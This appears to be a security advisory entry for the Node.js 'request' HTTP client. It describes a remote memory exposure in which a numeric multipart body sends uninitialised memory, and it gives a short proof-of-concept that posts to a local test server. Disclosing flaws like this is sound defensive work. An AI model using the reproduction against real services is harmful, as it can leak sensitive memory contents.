summary: "Remote Memory Exposure\nRequest is an http client. \n\nIf a request is made using\
  \ ```multipart```, and the body type is a ```number```, then the specified number of non-zero\
  \ memory is passed in the body. \n\nExample to reproduce:\n```\nvar request = require('request');\n\
  var http = require('http');\n\nvar serveFunction = function (req, res){\n\treq.on('data',\
  \ function (data) {\n            console.log(data)\n        });\n\tres.end();\n};\nvar server\
  \ = http.createServer(serveFunction);\nserver.listen(8000);\n\nrequest({\n\tmethod: \"POST\"\
  ,\n\turi: 'http://localhost:8000',\n\tmultipart: [{body:500}]\n},function(err,res,body){});\n\
  ```"
